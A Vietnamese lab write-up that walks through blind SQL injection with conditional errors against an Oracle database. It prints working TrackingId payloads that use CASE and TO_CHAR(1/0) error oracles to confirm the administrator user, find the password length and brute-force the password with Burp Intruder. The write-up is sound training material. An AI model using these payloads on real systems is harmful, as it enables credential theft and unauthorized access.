**Trước hết mình sẽ nói về kĩ thuật ``SQL injection with conditional errors`` trước.**
**Kỹ thuật này khác với các cuộc tấn công SQL Injection thông thường ở chỗ nó không trực tiếp trả về kết quả của câu lệnh SQL độc hại, mà sử dụng các lỗi điều kiện để xác định kết quả của truy vấn SQL bằng cách đưa ra các câu hỏi "có đúng hay không" (true/false).**

![image](https://user-images.githubusercontent.com/125866921/233150826-0f37f8c9-0442-4509-8a66-b011c5e92a6a.png)

  - Ở lab này chúng ta vẫn tiếp tục đi tìm tài khoản ``administrator``.  
  - Sau khi proxy trang web lên burpsutie thì ta thấy ở đây có phần ``TrackingId``. Ta sẽ inject vào đây.  

![image](https://user-images.githubusercontent.com/125866921/233158868-fbe187ca-9899-4165-b6b3-587fe945b3ac.png)

  - Ở phần ``TrackingId``, ta thử thêm ``'`` vào thì kết quả nó trả về lỗi.
  - Do đó ta có thể inject bằng những cách sử dụng ``'``.  

![image](https://user-images.githubusercontent.com/125866921/233159533-a98fd57d-2b82-44cd-8bfe-f5348713a1a6.png)

  - Ta có thể khai thác lỗi này khi mà đúng cú pháp SQL nhưng trả về lỗi.  
  - Sau 1 hồi mò mẫm mình thử thành công với câu lệnh sau: ``TrackingId=xyz'||(SELECT '')||'``

      - Toán tử ``||`` cho phép nối chuỗi dữ liệu và kết quả truy vấn.  
      - Cặp dấu ngoặc đơn ``()`` được sử dụng để nhóm các điều kiện hoặc phép tính lại với nhau.  

  - Trong trường hợp này, câu truy vấn vẫn có lẽ không hợp lệ. Có thể do loại database, ta thử chọn bảng dual.  

        '||(SELECT '' FROM dual)||'
        
  - Khi ta sử dụng câu truy vấn trên thì không trả về lỗi nữa, điều này cho thấy rằng mục tiêu có thể đang sử dụng cơ sở dữ liệu Oracle, cơ sở dữ liệu này yêu cầu tất cả các câu lệnh ``SELECT`` phải chỉ định rõ ràng tên bảng.  

![image](https://user-images.githubusercontent.com/125866921/233165833-eea5ea77-ff5c-4d87-b3f6-0cc301e562b8.png)

  - Lần này mình sẽ xây dựng 1 câu truy vấn hợp lệ, nhưng lại dẫn nó đến 1 bảng không tồn tại.  

        '||(SELECT '' FROM not-a-real-table)||'
        
  - Kết quả là nó vẫn trả về lỗi.  

![image](https://user-images.githubusercontent.com/125866921/233626499-cd4a4037-020b-4b23-b678-904d1b8165a9.png)

        '||(SELECT '' FROM users WHERE ROWNUM = 1)||'
        
  - Tiếp theo ta thử với câu lệnh truy vấn trên.  
  - Dùng một chuỗi rỗng từ bảng users với điều kiện ``ROWNUM`` bằng ``1``. ``ROWNUM`` là một cột giả của Oracle dùng để đánh số thứ tự cho các bản ghi trả về.  Kết quả không trả về lỗi chứng tỏ chúng ta không thể khai thác bằng cách này.  

![image](https://user-images.githubusercontent.com/125866921/233629056-6e83fe16-ca04-49df-9880-e2a7646e59b0.png)

        '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
        
  - Tiếp theo sử dụng hàm ``CASE`` để kiểm tra điều kiện ``(1=1)``. Vì điều kiện này luôn đúng, truy vấn con sẽ trả về kết quả của hàm ``TO_CHAR(1/0)``, tức là lỗi **division by zero (chia cho số không)**.  
  - Ta chỉnh sửa hàm ``CASE`` thành điều kiện ``(1=2)``. Thì kết quả không còn trả về lỗi nữa.  

![image](https://user-images.githubusercontent.com/125866921/233634253-3436aec7-5b73-420e-a02d-09c8214c7430.png)

        '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
        
  - Ta sử dụng câu truy vấn trên để check xem có ``username`` nào là ``administrator`` không.  
  - Kết quả trả về lỗi do đó chứng tỏ có tồn tại 1 tài khoản là ``administrator``.  
  - Ta đã tìm được tài khoản, việc tìm theo ta cần làm là tìm mật khẩu để đăng nhập vào cửa hàng.  

![image](https://user-images.githubusercontent.com/125866921/233635477-600a244a-613a-4629-9e6a-ab99792ebbb5.png)

        '||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
        
  - Ta sử dụng lệnh truy vấn để check xem độ dài của mật khẩu có bao nhiêu kí tự.  
  - Ở đây khi ta thấy kết quả trả về lỗi, nhưng khi tăng độ dài của mật khẩu đến ``>20`` thì lại không trả về lỗi nữa. Điều đó cho ta biết rằng chiều dài của mật khẩu có 20 kí tự là tối đa.  

![image](https://user-images.githubusercontent.com/125866921/233637126-e709e6f1-6644-4a61-b257-993929ba6574.png)

  - Bước cuối cùng, ta ``send to intruder`` sau đó với câu lệnh truy vấn là ``'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'``.  
  - Ở phần ``payloads`` ta sử dụng ``BruteForce``. Sau đó ``Start attack`` và thay đổi dần vị trí của các kí tự trong chuỗi mật khẩu.  
  - Sau khi hoàn thành BruteForce 20 kí tự mật khẩu thì ta chỉ việc đăng nhập và hoàn thành lab.  
